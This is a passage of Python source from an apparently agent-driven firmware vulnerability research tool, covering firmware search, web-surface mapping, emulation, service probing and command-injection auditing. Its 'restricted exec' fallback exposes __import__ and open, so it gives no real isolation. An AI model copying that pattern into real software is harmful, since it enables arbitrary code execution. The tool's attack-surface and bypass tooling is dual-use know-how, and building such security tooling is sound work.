    if p.is_dir():
        try:
            npat = (pattern or "").strip()
            lines = [f"SEARCH_PATTERN: {npat}"]
            hits = 0
            for fpath in p.rglob("*"):
                if hits >= max_results:
                    break
                if not fpath.is_file() or fpath.suffix in (".so", ".ko", ".o", ".bin", ".img"):
                    continue
                try:
                    txt = fpath.read_text(errors="replace")[:max_bytes]
                    if npat.lower() in txt.lower():
                        idx = txt.lower().find(npat.lower())
                        start_pos = max(0, idx - 40)
                        end_pos = min(len(txt), idx + len(npat) + 40)
                        snippet = txt[start_pos:end_pos].replace("\n", "\\n")[:120]
                        rel = str(fpath.relative_to(p))
                        lines.append(f"MATCH: {rel} :: {snippet}")
                        hits += 1
                except Exception:
                    pass
            if hits == 0:
                lines.append("NO_MATCHES")
            else:
                lines.append(f"MATCH_COUNT: {hits}")
            return _tool_result("firmware_search", [path, npat], "\n".join(lines), start=start)
        except Exception as exc:
            return _tool_result("firmware_search", [path, pattern], "", stderr=str(exc), return_code=-1, start=start)
    try:
        fs, _offset, stderr = _load_first_squashfs(path)
        if fs is None:
            stdout = "Unable to load an embedded SquashFS filesystem from the provided artifact."
            return _tool_result("firmware_search", [path, pattern], stdout, stderr=stderr, return_code=-1, start=start)

        normalized_pattern = str(pattern or "").strip()
        if not normalized_pattern:
            return _tool_result("firmware_search", [path, pattern], "SEARCH_PATTERN: (empty)", return_code=-1, start=start)

        normalized_mode = (mode or "auto").strip().lower()
        lines = [f"SEARCH_PATTERN: {normalized_pattern}"]
        hits = 0
        for inner_path in _iter_squashfs_file_paths(fs):
            if hits >= max_results:
                break
            blob = _read_squashfs_bytes(fs, inner_path, max_bytes=max_bytes)
            if not blob:
                continue
            hit_mode, snippets = _search_blob_for_pattern(blob, normalized_pattern, normalized_mode)
            for snippet in snippets:
                lines.append(f"MATCH: {inner_path} [{hit_mode}] :: {snippet}")
                hits += 1
                if hits >= max_results:
                    break

        if hits == 0:
            lines.append("NO_MATCHES")
        else:
            lines.append(f"MATCH_COUNT: {hits}")
        return _tool_result("firmware_search", [path, normalized_pattern, normalized_mode], "\n".join(lines), start=start)
    except Exception as exc:
        return _tool_result("firmware_search", [path, pattern, mode], "", stderr=str(exc), return_code=-1, start=start)


def _firmware_web_surface_map(path: str, max_results: int = 200, max_bytes: int = 131072) -> "ToolResult":
    start = time.perf_counter()
    p = Path(path)
    # Directory target → search for CGI, nginx conf, web roots directly
    if p.is_dir():
        try:
            lines = ["WEB_SURFACE_MAP (directory)"]
            cgi_dir = p / "www" / "cgi-bin"
            if cgi_dir.is_dir():
                for cgi in sorted(cgi_dir.iterdir()):
                    if cgi.is_file():
                        lines.append(f"CGI_BINARY: {cgi}")
            nginx_conf = p / "etc" / "nginx" / "conf.d"
            if nginx_conf.is_dir():
                for cf in sorted(nginx_conf.iterdir()):
                    try:
                        txt = cf.read_text()
                        lines.append(f"NGINX_CONF: {cf.name} ({len(txt)} chars)")
                    except Exception:
                        pass
            www_root = p / "www"
            if www_root.is_dir():
                for w in sorted(www_root.iterdir())[:30]:
                    lines.append(f"WEB_ROOT: {w.name}{'/' if w.is_dir() else ''}")
            return _tool_result("firmware_web_surface_map", [path], "\n".join(lines)[:max_bytes], start=start)
        except Exception as exc:
            return _tool_result("firmware_web_surface_map", [path], "", stderr=str(exc), return_code=-1, start=start)
    try:
        fs, _offset, stderr = _load_first_squashfs(path)
        if fs is None:
            stdout = "Unable to load an embedded SquashFS filesystem from the provided artifact."
            return _tool_result("firmware_web_surface_map", [path], stdout, stderr=stderr, return_code=-1, start=start)

        lines = ["WEB_SURFACE_MAP"]
        text_routes: dict[str, list[str]] = {}
        binary_routes: dict[str, list[str]] = {}
        binary_markers: dict[str, list[str]] = {}

        for inner_path in _iter_squashfs_file_paths(fs):
            blob = _read_squashfs_bytes(fs, inner_path, max_bytes=max_bytes)
            if not blob:
                continue
            if _is_web_text_candidate(inner_path, blob):
                for route in _extract_web_routes_from_text(_decode_blob_text(blob)):
                    if not _is_priority_web_route(inner_path, route):
                        continue
                    text_routes.setdefault(route, [])
                    if inner_path not in text_routes[route]:
                        text_routes[route].append(inner_path)
            elif _is_route_binary_candidate(inner_path, blob):
                strings = _extract_printable_strings(blob, limit=2000)
                for route in _extract_web_routes_from_strings(strings):
                    if not _is_priority_web_route(inner_path, route):
                        continue
                    binary_routes.setdefault(route, [])
                    if inner_path not in binary_routes[route]:
                        binary_routes[route].append(inner_path)
                for marker in _extract_handler_markers(strings):
                    binary_markers.setdefault(marker, [])
                    if inner_path not in binary_markers[marker]:
                        binary_markers[marker].append(inner_path)

        emitted = 0
        for route, sources in sorted(text_routes.items(), key=lambda item: item[0].lower()):
            for source in sources:
                lines.append(f"TEXT_ROUTE: {source} -> {route}")
                emitted += 1
                if emitted >= max_results:
                    return _tool_result("firmware_web_surface_map", [path], "\n".join(lines), start=start)

        for route, sources in sorted(binary_routes.items(), key=lambda item: item[0].lower()):
            for source in sources:
                lines.append(f"BINARY_ROUTE: {source} -> {route}")
                emitted += 1
                if emitted >= max_results:
                    return _tool_result("firmware_web_surface_map", [path], "\n".join(lines), start=start)

        for marker, sources in sorted(binary_markers.items(), key=lambda item: item[0].lower()):
            for source in sources:
                lines.append(f"BINARY_MARKER: {source} -> {marker}")
                emitted += 1
                if emitted >= max_results:
                    return _tool_result("firmware_web_surface_map", [path], "\n".join(lines), start=start)

        for route in sorted(set(text_routes) & set(binary_routes), key=str.lower):
            text_src = ",".join(text_routes.get(route, [])[:4])
            bin_src = ",".join(binary_routes.get(route, [])[:4])
            lines.append(f"ROUTE_CORRELATION: {route} :: web:{text_src} | binary:{bin_src}")
            emitted += 1
            if emitted >= max_results:
                break

        if emitted == 0:
            lines.append("NO_WEB_SURFACE_MATCHES")
        return _tool_result("firmware_web_surface_map", [path], "\n".join(lines), start=start)
    except Exception as exc:
        return _tool_result("firmware_web_surface_map", [path], "", stderr=str(exc), return_code=-1, start=start)


def _firmware_extract_rootfs(path: str) -> "ToolResult":
    start = time.perf_counter()
    try:
        artifact = Path(path).resolve()
        workspace = _runtime_workspace_for_artifact(artifact)
        extractor = FirmwareExtractor()
        rootfs_path, warnings = extractor.extract_rootfs(artifact, workspace)
        lines = [
            f"ARTIFACT_PATH: {artifact}",
            f"WORKSPACE_ROOT: {workspace.root}",
            f"ROOTFS_PATH: {rootfs_path if rootfs_path else ''}",
        ]
        for warning in warnings:
            lines.append(f"WARNING: {warning}")
        return_code = 0 if rootfs_path is not None else -1
        if rootfs_path is None and not warnings:
            lines.append("WARNING: No extractable rootfs was produced.")
        return _tool_result("firmware_extract_rootfs", path, "\n".join(lines), return_code=return_code, start=start)
    except Exception as exc:
        return _tool_result("firmware_extract_rootfs", path, "", stderr=str(exc), return_code=-1, start=start)


def _firmware_runtime_manifest(path: str) -> "ToolResult":
    start = time.perf_counter()
    try:
        artifact = Path(path).resolve()
        workspace = _runtime_workspace_for_artifact(artifact)
        extractor = FirmwareExtractor()
        manifest = extractor.build_manifest(artifact, workspace)
        lines = [
            f"ARTIFACT_PATH: {manifest.artifact_path}",
            f"WORKSPACE_ROOT: {manifest.workspace_root}",
            f"ROOTFS_PATH: {manifest.rootfs_path if manifest.rootfs_path else ''}",
            f"ARCHITECTURE: {manifest.architecture}",
            f"ENDIANNESS: {manifest.endianness}",
        ]
        for value in manifest.interpreters:
            lines.append(f"INTERPRETER: {value}")
        for value in manifest.dynamic_loaders:
            lines.append(f"DYNAMIC_LOADER: {value}")
        for value in manifest.init_candidates:
            lines.append(f"INIT_CANDIDATE: {value}")
        for value in manifest.web_roots:
            lines.append(f"WEB_ROOT: {value}")
        for value in manifest.warnings:
            lines.append(f"WARNING: {value}")
        return_code = 0 if manifest.rootfs_path is not None else -1
        return _tool_result("firmware_runtime_manifest", path, "\n".join(lines), return_code=return_code, start=start)
    except Exception as exc:
        return _tool_result("firmware_runtime_manifest", path, "", stderr=str(exc), return_code=-1, start=start)


def _firmware_service_inventory(path: str) -> "ToolResult":
    start = time.perf_counter()
    try:
        artifact = Path(path).resolve()
        workspace = _runtime_workspace_for_artifact(artifact)
        extractor = FirmwareExtractor()
        manifest = extractor.build_manifest(artifact, workspace)
        if manifest.rootfs_path is None:
            return _tool_result(
                "firmware_service_inventory",
                path,
                "SERVICE_INVENTORY_UNAVAILABLE",
                stderr="\n".join(manifest.warnings),
                return_code=-1,
                start=start,
            )
        inventory = build_service_inventory(manifest.rootfs_path)
        lines = [
            f"ROOTFS_PATH: {inventory.rootfs}",
            f"SERVICE_COUNT: {len(inventory.service_candidates)}",
        ]
        for candidate in inventory.service_candidates:
            argv = " ".join(candidate.launch_argv)
            lines.append(
                f"SERVICE: {candidate.service_type} :: {candidate.binary_name} :: {candidate.binary_path} :: {argv}"
            )
            if candidate.probe_port is not None:
                lines.append(
                    "SERVICE_PROBE: "
                    f"{candidate.binary_name} :: {candidate.service_type} :: "
                    f"{_probe_endpoint(candidate.probe_scheme or candidate.service_type, candidate.probe_port)}"
                )
        return _tool_result("firmware_service_inventory", path, "\n".join(lines), start=start)
    except Exception as exc:
        return _tool_result("firmware_service_inventory", path, "", stderr=str(exc), return_code=-1, start=start)


def _firmware_emulation_prepare(path: str) -> "ToolResult":
    start = time.perf_counter()
    try:
        requested_backend, execution_backend, _remote_executor = _resolve_execution_backend()
        artifact = Path(path).resolve()
        workspace = _runtime_workspace_for_artifact(artifact)
        extractor = FirmwareExtractor()
        manifest = extractor.build_manifest(artifact, workspace)
        if manifest.rootfs_path is None:
            return _tool_result(
                "firmware_emulation_prepare",
                path,
                "EMULATION_PREP_UNAVAILABLE",
                stderr="\n".join(manifest.warnings),
                return_code=-1,
                start=start,
            )
        if execution_backend == "ubuntu_ssh" and _remote_executor is not None:
            # Remote: QEMU lives on the server, use placeholder paths
            from vulnagent.firmware.emulation import EmulationPlan
            arch_map = {
                ("mips", "little"): "qemu-mipsel-static",
                ("mips", "big"): "qemu-mips-static",
                ("arm", "little"): "qemu-arm-static",
                ("aarch64", "little"): "qemu-aarch64-static",
            }
            qemu_name = arch_map.get((manifest.architecture, manifest.endianness), "qemu-mipsel-static")
            plan = EmulationPlan(
                qemu_binary=Path(qemu_name),
                launch_root=workspace.emulation_dir / "rootfs",
                launcher_script=workspace.emulation_dir / "launch-usermode.sh",
                env={"LD_LIBRARY_PATH": "/lib:/usr/lib:/usr/local/lib",
                     "PATH": "/bin:/sbin:/usr/bin:/usr/sbin"},
                warnings=[],
            )
            shutil.copytree(str(manifest.rootfs_path), str(plan.launch_root), dirs_exist_ok=True)
            plan.launcher_script.parent.mkdir(parents=True, exist_ok=True)
            plan.launcher_script.write_text("#!/bin/sh\nexec \"$@\"\n", encoding="utf-8")
        else:
            preparer = EmulationPreparer()
            plan = preparer.prepare_usermode_plan(manifest, workspace)
        lines = [
            f"REQUESTED_BACKEND: {requested_backend}",
            f"EXECUTION_BACKEND: {execution_backend}",
            f"WORKSPACE_ROOT: {workspace.root}",
            f"ROOTFS_PATH: {manifest.rootfs_path}",
            f"QEMU_BINARY: {plan.qemu_binary}",
            f"LAUNCH_ROOT: {plan.launch_root}",
            f"LAUNCHER_SCRIPT: {plan.launcher_script}",
        ]
        for key, value in sorted(plan.env.items()):
            lines.append(f"ENV: {key}={value}")
        for warning in plan.warnings:
            lines.append(f"WARNING: {warning}")
        return _tool_result("firmware_emulation_prepare", path, "\n".join(lines), start=start)
    except Exception as exc:
        return _tool_result("firmware_emulation_prepare", path, "", stderr=str(exc), return_code=-1, start=start)


def _firmware_emulation_launch_user(path: str) -> "ToolResult":
    start = time.perf_counter()
    try:
        requested_backend, execution_backend, _remote_executor = _resolve_execution_backend()
        artifact = Path(path).resolve()
        workspace = _runtime_workspace_for_artifact(artifact)
        extractor = FirmwareExtractor()
        manifest = extractor.build_manifest(artifact, workspace)
        if manifest.rootfs_path is None:
            return _tool_result(
                "firmware_emulation_launch_user",
                path,
                "USERMODE_LAUNCH_UNAVAILABLE",
                stderr="\n".join(manifest.warnings),
                return_code=-1,
                start=start,
            )
        inventory = build_service_inventory(manifest.rootfs_path)
        if not inventory.service_candidates:
            return _tool_result(
                "firmware_emulation_launch_user",
                path,
                "NO_SERVICE_CANDIDATES",
                return_code=-1,
                start=start,
            )
        preparer = EmulationPreparer()
        plan = preparer.prepare_usermode_plan(manifest, workspace)
        candidate = inventory.service_candidates[0]
        runner = EmulationRunner(remote_executor=_remote_executor, sandbox=_sandbox)

        # Pre-flight: verify QEMU binary exists on remote host PATH
        if execution_backend == "ubuntu_ssh" and _remote_executor:
            try:
                qemu_name = plan.qemu_binary.name if hasattr(plan.qemu_binary, 'name') else str(plan.qemu_binary)
                qemu_check = _remote_executor.execute(
                    f"which {qemu_name} >/dev/null 2>&1 && echo QEMU_OK || echo QEMU_MISSING",
                    timeout=10,
                )
                if "QEMU_MISSING" in (qemu_check.stdout or ""):
                    return _tool_result(
                        "firmware_emulation_launch_user", path,
                        f"QEMU binary not found on remote: {qemu_name}. "
                        f"Install with: apt-get install qemu-user-static",
                        return_code=-1, start=start)
            except Exception:
                pass

        command = runner.build_command(plan, candidate, manifest.rootfs_path)
        launch_binary = Path(command[3]) if len(command) > 3 else candidate.binary_path
        result = runner.run_candidate(plan, command, cwd=plan.launch_root)
        lines = [
            f"REQUESTED_BACKEND: {requested_backend}",
            f"EXECUTION_BACKEND: {execution_backend}",
            f"SERVICE_TYPE: {candidate.service_type}",
            f"BINARY_PATH: {launch_binary}",
            f"RETURN_CODE: {result.return_code}",
            f"LOG_PATH: {result.log_path}",
            f"COMMAND: {' '.join(result.command)}",
        ]
        if candidate.probe_port is not None:
            probe_scheme = candidate.probe_scheme or candidate.service_type
            lines.extend([
                f"PROBE_SERVICE_TYPE: {candidate.service_type}",
                f"PROBE_PORT: {candidate.probe_port}",
                f"PROBE_SCHEME: {probe_scheme}",
                f"PROBE_ENDPOINT: {_probe_endpoint(probe_scheme, candidate.probe_port)}",
            ])
        if result.stdout:
            lines.append(f"STDOUT: {result.stdout[:400]}")
        if result.stderr:
            lines.append(f"STDERR: {result.stderr[:400]}")
        return _tool_result(
            "firmware_emulation_launch_user",
            path,
            "\n".join(lines),
            return_code=result.return_code,
            start=start,
        )
    except Exception as exc:
        return _tool_result("firmware_emulation_launch_user", path, "", stderr=str(exc), return_code=-1, start=start)


def _firmware_emulation_probe(port: int, service_type: str = "http") -> "ToolResult":
    start = time.perf_counter()
    try:
        PROBE_CALLS = getattr(_firmware_emulation_probe, "_call_count", 0) + 1
        _firmware_emulation_probe._call_count = PROBE_CALLS
        if PROBE_CALLS > 5:
            return _tool_result(
                "firmware_emulation_probe", port,
                f"PROBE_LIMIT_EXCEEDED: {PROBE_CALLS}/10 max. Switch to static analysis or generate_poc.",
                return_code=-1, start=start,
            )
        requested_backend, execution_backend, _remote_executor = _resolve_execution_backend()
        runner = EmulationRunner(remote_executor=_remote_executor, sandbox=_sandbox)
        result = runner.probe_service(service_type, port)
        lines = [
            f"REQUESTED_BACKEND: {requested_backend}",
            f"EXECUTION_BACKEND: {execution_backend}",
            f"SERVICE_TYPE: {result.service_type}",
            f"ENDPOINT: {result.endpoint}",
            f"REACHABLE: {str(result.reachable).lower()}",
            f"SUMMARY: {result.summary}",
        ]
        if result.details:
            lines.append(f"DETAILS: {result.details[:400]}")
        return _tool_result("firmware_emulation_probe", port, "\n".join(lines), return_code=0 if result.reachable else -1, start=start)
    except Exception as exc:
        return _tool_result("firmware_emulation_probe", port, "", stderr=str(exc), return_code=-1, start=start)


def _firmware_emulation_launch_system(path: str) -> "ToolResult":
    start = time.perf_counter()
    try:
        requested_backend, execution_backend, _remote_executor = _resolve_execution_backend()
        artifact = Path(path).resolve()
        workspace = _runtime_workspace_for_artifact(artifact)
        extractor = FirmwareExtractor()
        manifest = extractor.build_manifest(artifact, workspace)
        plan = build_systemmode_plan(manifest, workspace)
        package_path = build_systemmode_package(manifest, workspace)
        lines = [
            f"REQUESTED_BACKEND: {requested_backend}",
            f"EXECUTION_BACKEND: {execution_backend}",
            f"WORKSPACE_ROOT: {workspace.root}",
            f"PACKAGE_PATH: {package_path}",
            f"ARCHITECTURE: {manifest.architecture}",
            f"ENDIANNESS: {manifest.endianness}",
            f"ROOTFS_PATH: {manifest.rootfs_path if manifest.rootfs_path else ''}",
            f"MACHINE: {plan.machine}",
            f"QEMU_BINARY: {plan.qemu_binary if plan.qemu_binary else ''}",
            f"SERIAL_LOG: {plan.serial_log_path}",
        ]
        for kernel_path in plan.kernel_candidates:
            lines.append(f"KERNEL_CANDIDATE: {kernel_path}")
        for warning in plan.warnings:
            lines.append(f"WARNING: {warning}")
        runner = EmulationRunner(remote_executor=_remote_executor, sandbox=_sandbox)
        best_return_code = 0 if not plan.attempted_commands and plan.qemu_binary else -1
        for index, command in enumerate(plan.attempted_commands[:3], start=1):
            result = runner.run_command(
                command,
                log_path=plan.package_dir / f"system-attempt-{index}.log",
                cwd=plan.package_dir,
                timeout=15,
            )
            best_return_code = result.return_code
            lines.append(f"ATTEMPT_{index}_RETURN_CODE: {result.return_code}")
            lines.append(f"ATTEMPT_{index}_LOG: {result.log_path}")
            lines.append(f"ATTEMPT_{index}_COMMAND: {' '.join(result.command)}")
            if result.stderr:
                lines.append(f"ATTEMPT_{index}_STDERR: {result.stderr[:400]}")
            if result.return_code == 0:
                break
        return _tool_result("firmware_emulation_launch_system", path, "\n".join(lines), return_code=best_return_code, start=start)
    except Exception as exc:
        return _tool_result("firmware_emulation_launch_system", path, "", stderr=str(exc), return_code=-1, start=start)


def _firmware_binary_audit(rootfs_path: str) -> "ToolResult":
    """Audit ELF binaries in a firmware rootfs for command injection patterns."""
    import time as _time
    from vulnagent.tools.executor import ToolResult

    start = _time.perf_counter()
    try:
        report = audit_rootfs(rootfs_path)
        json_out = _audit_report_json(report)
        summary = (
            f"Scanned {report.total_binaries} ELF binaries.\n"
            f"Risky binaries (system/popen + shell cmd patterns): {report.risky_binaries}\n"
            f"Command injection findings: {len(report.findings)}\n"
        )
        for f in report.findings:
            summary += (
                f"\n  {f.binary_path} [{f.severity}]\n"
                f"    MD5: {f.binary_md5}\n"
                f"    Type: {f.evidence_type}\n"
                f"    Blacklist offset: 0x{f.file_offsets.get('blacklist', 0):x}\n"
                f"    Missing metachars: {', '.join(f.missing_metachars[:8])}\n"
                f"    Bypass vector: {f.bypass_vector or 'none identified'}\n"
            )
        return ToolResult(
            tool_name="firmware_binary_audit",
            command=[],
            return_code=0,
            stdout=summary + "\n\n--- JSON OUTPUT ---\n" + json_out,
            stderr="",
            duration_ms=(_time.perf_counter() - start) * 1000,
        )
    except Exception as exc:
        return ToolResult(
            tool_name="firmware_binary_audit",
            command=[],
            return_code=-1,
            stdout="",
            stderr=str(exc),
            duration_ms=(_time.perf_counter() - start) * 1000,
        )


# ── elf_surface_scan executor ──

def _elf_surface_scan(dir_path: str) -> "ToolResult":
    """Quick ELF scan of a directory — finds binaries with system()/popen()."""
    import time as _time
    from vulnagent.firmware.binary_audit import audit_elf_binaries
    from vulnagent.tools.executor import ToolResult

    start = _time.perf_counter()
    try:
        findings, summary = audit_elf_binaries(dir_path)
        lines: list[str] = [
            f"Scanned {summary['total_elf_binaries']} ELF binaries.",
            f"Findings: {summary['findings_count']} (CRITICAL: {summary['critical_count']})",
            "",
        ]
        for f in findings:
            lines.append(
                f"[{f.severity}] {f.binary_path} ({f.arch}) "
                f"imports={f.dangerous_imports} "
                f"cmd_patterns={f.shell_cmd_patterns[:4]}"
            )
        lines.append("")
        lines.append("--- SUMMARY DICT (for tier gate) ---")
        import json as _json
        lines.append(_json.dumps({
            "candidate_findings": summary["candidate_findings"],
            "priority_targets": summary["priority_targets"],
            "next_steps": summary["next_steps"],
        }, indent=2))
        return ToolResult(
            tool_name="elf_surface_scan",
            command=[], return_code=0,
            stdout="\n".join(lines), stderr="",
            duration_ms=(_time.perf_counter() - start) * 1000,
        )
    except Exception as exc:
        return ToolResult(
            tool_name="elf_surface_scan",
            command=[], return_code=-1,
            stdout="", stderr=str(exc),
            duration_ms=(_time.perf_counter() - start) * 1000,
        )


# ── qemu_elf_exec executor ──

def _qemu_elf_exec(elf_path: str, rootfs_path: str = "",
                   env_vars: str = "", stdin_data: str = "",
                   strace: bool = False, timeout_s: int = 10) -> "ToolResult":
    """Execute an ELF binary under QEMU user-mode emulation."""
    import time as _time
    from vulnagent.tools.executor import ToolResult

    start = _time.perf_counter()
    qemu_bin = ""
    try:
        with open(elf_path, "rb") as fh:
            header = fh.read(20)
        if header[:4] != b"\x7fELF":
            return ToolResult("qemu_elf_exec", [], -1, "",
                              f"Not an ELF file: {elf_path}",
                              (_time.perf_counter() - start) * 1000)

        machine = int.from_bytes(header[0x12:0x14], "little")
        _QEMU_MAP = {40: "qemu-arm-static", 183: "qemu-aarch64-static",
                     8: "qemu-mipsel-static", 3: "qemu-i386-static",
                     62: "qemu-x86_64-static"}
        qemu_bin = _QEMU_MAP.get(machine)
        if not qemu_bin:
            return ToolResult("qemu_elf_exec", [], -1, "",
                              f"Unsupported arch (machine={machine})",
                              (_time.perf_counter() - start) * 1000)

        cmd = [qemu_bin]
        if strace:
            cmd.append("-strace")
        if rootfs_path:
            cmd.extend(["-L", rootfs_path])
        cmd.append(elf_path)

        import os as _os
        env = dict(_os.environ)
        if env_vars:
            for pair in env_vars.split(","):
                if "=" in pair:
                    k, v = pair.split("=", 1)
                    env[k.strip()] = v.strip()

        proc = subprocess.run(
            cmd, input=stdin_data.encode() if stdin_data else None,
            capture_output=True, timeout=timeout_s, env=env,
        )
        elapsed = _time.perf_counter() - start
        return ToolResult(
            tool_name="qemu_elf_exec",
            command=cmd, return_code=proc.returncode,
            stdout=proc.stdout.decode(errors="replace")[:8192],
            stderr=proc.stderr.decode(errors="replace")[:4096],
            duration_ms=elapsed * 1000,
        )
    except subprocess.TimeoutExpired:
        return ToolResult("qemu_elf_exec", [], -1, "(timeout)", "",
                          (_time.perf_counter() - start) * 1000, timed_out=True)
    except FileNotFoundError:
        return ToolResult("qemu_elf_exec", [], -1, "",
                          f"QEMU not found ({qemu_bin}). Install: apt install qemu-user-static",
                          (_time.perf_counter() - start) * 1000)
    except Exception as exc:
        return ToolResult("qemu_elf_exec", [], -1, "", str(exc),
                          (_time.perf_counter() - start) * 1000)


# ── ubi_extract executor ──

def _ubi_extract_files(ubi_path: str, output_dir: str) -> "ToolResult":
    """Extract UBIFS volumes from a UBI image."""
    import time as _time
    from vulnagent.tools.executor import ToolResult

    start = _time.perf_counter()
    try:
        output = Path(output_dir)
        output.mkdir(parents=True, exist_ok=True)

        with open(ubi_path, "rb") as f:
            data = f.read()

        PEB_SIZE = 0x20000
        volumes: dict[int, dict[int, tuple[int, int]]] = {}

        for off in range(0, len(data) - 512, PEB_SIZE):
            if data[off:off + 4] != b"UBI#":
                continue
            vo = int.from_bytes(data[off + 16:off + 20], "big")
            do = int.from_bytes(data[off + 20:off + 24], "big")
            vp = off + vo
            if vp + 64 > len(data) or data[vp:vp + 4] != b"UBI!":
                continue
            vi = int.from_bytes(data[vp + 8:vp + 12], "big")
            ln = int.from_bytes(data[vp + 12:vp + 16], "big")
            ds = int.from_bytes(data[vp + 0x14:vp + 0x18], "big")
            if ds == 0:
                ds = int.from_bytes(data[vp + 0x3C:vp + 0x40], "big")
            if ds == 0:
                ds = PEB_SIZE - do
            if vi >= 0x7FFFE000:
                continue
            volumes.setdefault(vi, {})[ln] = (off + do, ds)

        lines: list[str] = [f"UBI image: {len(data)} bytes, {len(volumes)} volume(s)"]
        LEB_DATA = PEB_SIZE - 0x1000
        for vi in sorted(volumes):
            blks = volumes[vi]
            max_leb = max(blks.keys())
            out_path = output / f"volume_{vi}.ubifs"
            with open(out_path, "wb") as out:
                out.truncate((max_leb + 1) * LEB_DATA)
                for leb in sorted(blks):
                    dstart, dsize = blks[leb]
                    out.seek(leb * LEB_DATA)
                    out.write(data[dstart:dstart + min(dsize, LEB_DATA)])
            sz = out_path.stat().st_size
            lines.append(f"  Volume {vi}: {len(blks)} LEBs → {out_path} ({sz:,} bytes)")

        elapsed = _time.perf_counter() - start
        return ToolResult("ubi_extract", [], 0, "\n".join(lines), "",
                          elapsed * 1000)
    except Exception as exc:
        return ToolResult("ubi_extract", [], -1, "", str(exc),
                          (_time.perf_counter() - start) * 1000)


def _execute_python(code: str) -> "ToolResult":
    import subprocess
    import time
    from vulnagent.tools.executor import ToolResult

    start = time.perf_counter()

    # Route through sandbox for isolation when available
    if _sandbox is not None:
        try:
            encoded = code.replace("'", "'\\''")
            result = _sandbox.execute(
                f"python3 -c '{encoded}'",
                timeout=30,
            )
            return ToolResult(
                tool_name="python_exec",
                command=["python3", "-c", code],
                return_code=result.return_code,
                stdout=result.stdout or "",
                stderr=result.stderr or "",
                duration_ms=(time.perf_counter() - start) * 1000,
            )
        except Exception:
            pass  # Fall through to restricted exec if sandbox fails

    # No sandbox: use restricted exec() with safe builtins
    safe_globals = {
        "__builtins__": {
            "abs": abs, "all": all, "any": any, "bin": bin, "bool": bool,
            "chr": chr, "dict": dict, "enumerate": enumerate, "filter": filter,
            "float": float, "format": format, "frozenset": frozenset,
            "hex": hex, "int": int, "isinstance": isinstance,
            "len": len, "list": list, "map": map, "max": max, "min": min,
            "oct": oct, "ord": ord, "pow": pow, "print": print,
            "range": range, "repr": repr, "reversed": reversed,
            "round": round, "set": set, "slice": slice, "sorted": sorted,
            "str": str, "sum": sum, "tuple": tuple, "type": type, "zip": zip,
            "bytes": bytes, "bytearray": bytearray,
            "Exception": Exception, "ValueError": ValueError,
            "TypeError": TypeError, "KeyError": KeyError,
            "IndexError": IndexError, "StopIteration": StopIteration,
            "True": True, "False": False, "None": None,
            # Allow basic imports for data analysis
            "json": __import__("json"), "re": __import__("re"),
            "base64": __import__("base64"), "hashlib": __import__("hashlib"),
            "struct": __import__("struct"),
            "__import__": __import__,  # allow importing safe modules
            "open": open, "dir": dir, "help": help,
        },
    }
    safe_locals: dict = {}
    try:
        exec(code, safe_globals, safe_locals)
        stdout = str(safe_locals.get("result", safe_locals))
        return ToolResult(
            tool_name="python_exec",
            command=["python", "-c", code],
            return_code=0,
            stdout=stdout,
            stderr="",
            duration_ms=(time.perf_counter() - start) * 1000,
        )
    except Exception as exc:
        return ToolResult(
            tool_name="python_exec",
            command=["python", "-c", code],
            return_code=-1,
            stdout="",
            stderr=str(exc),
            duration_ms=(time.perf_counter() - start) * 1000,
        )


def _read_file(path: str) -> "ToolResult":
    import time
    from vulnagent.tools.executor import ToolResult

    start = time.perf_counter()
    try:
        with open(path, encoding="utf-8", errors="replace") as f:
            content = f.read()
        return ToolResult(
            tool_name="file_read",
            command=path,
            return_code=0,
            stdout=content[:10000],
            stderr="",
            duration_ms=(time.perf_counter() - start) * 1000,
        )
    except Exception as e:
        return ToolResult(
            tool_name="file_read",
            command=path,
            return_code=-1,
            stdout="",
            stderr=str(e),
            duration_ms=(time.perf_counter() - start) * 1000,
        )


def _execute(command: str | list[str], timeout: int = 300) -> "ToolResult":
    """Internal helper to execute a command via ToolExecutor."""
    from vulnagent.tools.executor import ToolExecutor, ToolResult

    # ── L1 command gate: check constraint engine before execution ──
    if _constraint_engine is not None:
        cmd_str = command if isinstance(command, str) else " ".join(command)
        enforcement = _constraint_engine.check_command(cmd_str)
        if not enforcement.allowed:
            return ToolResult(
                tool_name="blocked",
                command=command,
                return_code=-1,
                stdout="",
                stderr=f"[CONSTRAINT ENGINE BLOCKED] {enforcement.reason}",
                duration_ms=0.0,
                timed_out=False,
            )

    executor = ToolExecutor(timeout_seconds=timeout, constraint_engine=_constraint_engine)
    return executor.execute(command)


# ── Pure-Python binary analysis tools ──

def _python_disassemble(path: str) -> "ToolResult":
    import time as _time
    from vulnagent.tools.executor import ToolResult
    start = _time.perf_counter()
    try:
        from vulnagent.tools.python_tools import python_objdump
        stdout = python_objdump(path)
        return ToolResult(tool_name="python_disassemble", command=[path], stdout=stdout,
                          return_code=0, duration_ms=(_time.perf_counter()-start)*1000)
    except Exception as e:
        return ToolResult(tool_name="python_disassemble", command=[path], stdout="",
                          stderr=str(e), return_code=-1, duration_ms=(_time.perf_counter()-start)*1000)


def _python_checksec(path: str) -> "ToolResult":
    import time as _time
    from vulnagent.tools.executor import ToolResult
    start = _time.perf_counter()
    try:
        from vulnagent.tools.python_tools import python_checksec
        stdout = python_checksec(path)
        return ToolResult(tool_name="python_checksec", command=[path], stdout=stdout,
                          return_code=0, duration_ms=(_time.perf_counter()-start)*1000)
    except Exception as e:
        return ToolResult(tool_name="python_checksec", command=[path], stdout="",
                          stderr=str(e), return_code=-1, duration_ms=(_time.perf_counter()-start)*1000)


def _python_strings_extract(path: str, min_length: int = 4) -> "ToolResult":
    import time as _time
    from vulnagent.tools.executor import ToolResult
    start = _time.perf_counter()
    try:
        from vulnagent.tools.python_tools import python_strings
        stdout = python_strings(path, min_length=min_length)
        return ToolResult(tool_name="python_strings", command=[path], stdout=stdout[:8000],
                          return_code=0, duration_ms=(_time.perf_counter()-start)*1000)
    except Exception as e:
        return ToolResult(tool_name="python_strings", command=[path], stdout="",
                          stderr=str(e), return_code=-1, duration_ms=(_time.perf_counter()-start)*1000)


def _python_http_scan(url: str) -> "ToolResult":
    import time as _time
    from vulnagent.tools.executor import ToolResult
    start = _time.perf_counter()
    try:
        from vulnagent.tools.python_tools import python_http_scan
        stdout = python_http_scan(url)
        return ToolResult(tool_name="python_http_scan", command=[url], stdout=stdout,
                          return_code=0, duration_ms=(_time.perf_counter()-start)*1000)
    except Exception as e:
        return ToolResult(tool_name="python_http_scan", command=[url], stdout="",
                          stderr=str(e), return_code=-1, duration_ms=(_time.perf_counter()-start)*1000)


def _fuzz_target(host: str, port: int, protocol: str = "http", timeout: int = 60) -> "ToolResult":
